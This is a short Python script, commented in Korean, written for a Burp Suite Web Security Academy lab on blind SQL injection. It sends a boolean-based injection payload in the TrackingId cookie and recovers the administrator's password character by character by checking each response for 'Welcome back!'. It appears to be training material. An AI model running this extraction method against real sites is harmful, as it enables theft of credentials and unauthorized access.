import requests
import string

# Burp Suite Academy Blind SQLi 실습 머신에 적용
url = "https://0a1d009a04ab2194834600cc000b006d.web-security-academy.net/"
tracking_id = "trackingIdValue"
session_cookie = "sessionCookieValue"
username = "administrator"
password_length = 20

# 탐색할 문자 목록 (a-z, 0-9)
charset = string.ascii_lowercase + string.digits

def find_password():
    password = ""
    for i in range(1, password_length + 1): # 1 ~ 20까지 순회 # 비밀번호 20자리
        for char in charset:
            payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='{username}')='{char}"
            cookies = {'TrackingId': tracking_id + payload, 'session': session_cookie}
            response = requests.get(url, cookies=cookies)
            
            if "Welcome back!" in response.text:  # 탐지 성공 조건
                password += char
                print(f"현재까지 찾은 비밀번호: {password}")
                break

    return password

if __name__ == "__main__":
    found_password = find_password()
    print(f"완전한 비밀번호: {found_password}")
